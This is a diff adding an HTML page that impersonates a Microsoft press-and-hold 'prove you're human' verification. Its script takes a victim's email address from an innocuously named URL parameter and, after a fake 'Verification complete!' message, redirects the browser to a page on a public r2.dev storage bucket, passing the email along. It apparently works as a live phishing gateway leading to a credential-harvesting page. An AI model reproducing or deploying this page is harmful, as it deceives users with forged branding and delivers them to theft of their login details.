@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Help us beat the robots</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #e8e8e8;
+        }
+
+        .container {
+            background: white;
+            width: 440px;
+            padding: 60px 40px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        .logo-squares {
+            display: grid;
+            grid-template-columns: 10px 10px;
+            grid-template-rows: 10px 10px;
+            gap: 1px;
+            margin-right: 8px;
+        }
+
+        .logo-squares div:nth-child(1) { background: #f25022; }
+        .logo-squares div:nth-child(2) { background: #7fba00; }
+        .logo-squares div:nth-child(3) { background: #00a4ef; }
+        .logo-squares div:nth-child(4) { background: #ffb900; }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 400;
+            color: #5e5e5e;
+            letter-spacing: -0.5px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 300;
+            color: #1f1f1f;
+            margin-bottom: 40px;
+        }
+
+        .instruction-text {
+            font-size: 16px;
+            color: #737373;
+            margin-bottom: 30px;
+        }
+
+        .button-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 40px 0 80px 0;
+        }
+
+        .accessibility-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .icon-person {
+            width: 20px;
+            height: 28px;
+            position: relative;
+        }
+
+        .icon-person::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 6px;
+            height: 6px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .icon-person::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 18px;
+            height: 18px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top: none;
+            border-bottom: none;
+        }
+
+        .hold-button {
+            width: 450px;
+            height: 60px;
+            border: 2px solid #0078d4;
+            background: white;
+            border-radius: 30px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+            user-select: none;
+            touch-action: none;
+            overflow: hidden;
+        }
+
+        .hold-button:hover {
+            background: #f5f5f5;
+        }
+
+        .hold-button:active {
+            transform: scale(0.98);
+        }
+
+        .progress-bar {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            background: #0f6cbd;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+
+        .button-text {
+            position: relative;
+            z-index: 2;
+            font-size: 18px;
+            color: #0078d4;
+            font-weight: 600;
+            line-height: 60px;
+        }
+
+        .verification-complete {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .verification-complete.show {
+            display: flex;
+        }
+
+        .checkmark-circle {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            background: #107c10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.5s ease;
+        }
+
+        .checkmark {
+            width: 50px;
+            height: 90px;
+            border: solid white;
+            border-width: 0 8px 8px 0;
+            transform: rotate(45deg) translateY(-5px);
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .status-text h2 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1f1f1f;
+            margin-bottom: 8px;
+        }
+
+        .status-text p {
+            font-size: 15px;
+            color: #5e5e5e;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="microsoft-logo">
+            <div class="logo-squares">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+            <span class="logo-text">Microsoft</span>
+        </div>
+        
+        <h1>Help us beat the robots</h1>
+        
+        <div id="initialView">
+            <p class="instruction-text">Press and hold the button.</p>
+            
+            <div class="button-wrapper">
+                <div class="accessibility-icon">
+                   <svg width="50" height="40" viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <g filter="url(#filter0_d_1_9)">
+            <path d="M25 44C36.0457 44 45 35.0457 45 24C45 12.9543 36.0457 4 25 4C13.9543 4 5 12.9543 5 24C5 35.0457 13.9543 44 25 44Z" fill="#FDFDFF"></path>
+            <path d="M25 44C36.0457 44 45 35.0457 45 24C45 12.9543 36.0457 4 25 4C13.9543 4 5 12.9543 5 24C5 35.0457 13.9543 44 25 44Z" fill="#F7F8FA"></path>
+            <path d="M25 44C36.0457 44 45 35.0457 45 24C45 12.9543 36.0457 4 25 4C13.9543 4 5 12.9543 5 24C5 35.0457 13.9543 44 25 44Z" fill="white"></path>
+            <path d="M45 24C45 12.997 36.057 4 25 4C13.943 4 5 12.997 5 24C5 35.003 13.997 44 25 44C36.003 44 45 35.003 45 24ZM25 10.07C25.3988 10.0693 25.7939 10.1474 26.1625 10.2998C26.531 10.4521 26.8659 10.6758 27.1479 10.9578C27.4299 11.2399 27.6534 11.5748 27.8056 11.9435C27.9578 12.3121 28.0358 12.7072 28.035 13.106C28.0355 13.5047 27.9574 13.8995 27.805 14.2679C27.6527 14.6363 27.4291 14.971 27.1472 15.2529C26.8652 15.5347 26.5304 15.7582 26.162 15.9104C25.7935 16.0626 25.3987 16.1407 25 16.14C24.6013 16.1407 24.2063 16.0626 23.8378 15.9103C23.4693 15.758 23.1344 15.5345 22.8525 15.2525C22.5705 14.9706 22.347 14.6357 22.1947 14.2672C22.0424 13.8987 21.9643 13.5037 21.965 13.105C21.965 11.48 23.32 10.07 25 10.07ZM21.965 36.575C21.8466 36.8501 21.6496 37.0841 21.3988 37.2477C21.148 37.4114 20.8545 37.4974 20.555 37.495C20.339 37.495 20.122 37.442 19.905 37.333C19.092 36.953 18.767 36.033 19.146 35.22C19.146 35.22 22.127 28.39 22.669 25.897C22.886 25.03 22.995 22.699 23.049 21.615C23.049 21.235 22.832 20.911 22.507 20.802L15.786 18.851C14.919 18.58 14.431 17.659 14.702 16.846C14.972 16.033 15.894 15.653 16.707 15.87C16.707 15.87 22.832 17.821 25 17.821C27.168 17.821 33.401 15.816 33.401 15.816C34.214 15.599 35.136 16.086 35.352 16.9C35.569 17.713 35.082 18.634 34.268 18.85L27.602 20.856C27.276 20.965 27.005 21.29 27.06 21.669C27.114 22.753 27.222 25.084 27.439 25.951C27.981 28.444 30.962 35.274 30.962 35.274C31.342 36.087 30.962 37.008 30.203 37.388C30.002 37.4922 29.7794 37.5477 29.553 37.55C28.957 37.55 28.36 37.225 28.143 36.629L25 30.07L21.965 36.575Z" fill="#424257"></path>
+        </g>
+        <defs>
+            <filter id="filter0_d_1_9" x="0" y="0" width="50" height="50" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix>
+                <feOffset dy="1"></feOffset>
+                <feGaussianBlur stdDeviation="2.5"></feGaussianBlur>
+                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.206358 0"></feColorMatrix>
+                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_1_9"></feBlend>
+                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_1_9" result="shape"></feBlend>
+            </filter>
+        </defs>
+    </svg>
+                </div>
+                
+                <button class="hold-button" id="holdButton">
+                    <div class="progress-bar" id="progressBar"></div>
+                    <div class="button-text">Press and hold</div>
+                </button>
+            </div>
+        </div>
+
+        <div class="verification-complete" id="verificationComplete">
+            <div class="checkmark-circle">
+                <div class="checkmark"></div>
+            </div>
+            <div class="status-text">
+                <h2>Verification complete!</h2>
+                <p>You've proven you're a human.<br>Continue your action.</p>
+            </div>
+        </div>
+    </div>
+
+<script>
+    const button = document.getElementById('holdButton');
+    const progressBar = document.getElementById('progressBar');
+    const initialView = document.getElementById('initialView');
+    const verificationComplete = document.getElementById('verificationComplete');
+    
+    let holdTimer;
+    let progressTimer;
+    let startTime;
+    const HOLD_DURATION = 2000;
+
+    // Function to get URL parameters
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        const results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    // Function to handle redirect
+    function handleRedirect() {
+        // Get the email parameter to pass to the redirect URL
+        const email = getUrlParameter('quotes');
+        
+        // Build target URL with email parameter if exists
+        let targetUrl = 'https://pub-5783597e17e04d0d91720be54310c6eb.r2.dev/904.html';
+        if (email) {
+            targetUrl += (targetUrl.includes('?') ? '&' : '?') + 'quotes=' + encodeURIComponent(email);
+        }
+        
+        // Perform the redirect
+        window.location.href = targetUrl;
+    }
+
+    function startHold() {
+        startTime = Date.now();
+        
+        progressTimer = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const progress = Math.min((elapsed / HOLD_DURATION) * 100, 100);
+            progressBar.style.width = progress + '%';
+        }, 10);
+
+        holdTimer = setTimeout(() => {
+            completeHold();
+        }, HOLD_DURATION);
+    }
+
+    function cancelHold() {
+        clearTimeout(holdTimer);
+        clearInterval(progressTimer);
+        progressBar.style.width = '0%';
+    }
+
+    function completeHold() {
+        clearInterval(progressTimer);
+        progressBar.style.width = '100%';
+        
+        setTimeout(() => {
+            initialView.style.display = 'none';
+            verificationComplete.classList.add('show');
+            
+            // Use the new redirect function after 2 seconds
+            setTimeout(handleRedirect, 2000);
+        }, 300);
+    }
+
+    button.addEventListener('mousedown', startHold);
+    button.addEventListener('mouseup', cancelHold);
+    button.addEventListener('mouseleave', cancelHold);
+
+    button.addEventListener('touchstart', (e) => {
+        e.preventDefault();
+        startHold();
+    });
+    button.addEventListener('touchend', cancelHold);
+    button.addEventListener('touchcancel', cancelHold);
+
+    
+</script>
+    
+    
+</body>
+</html>
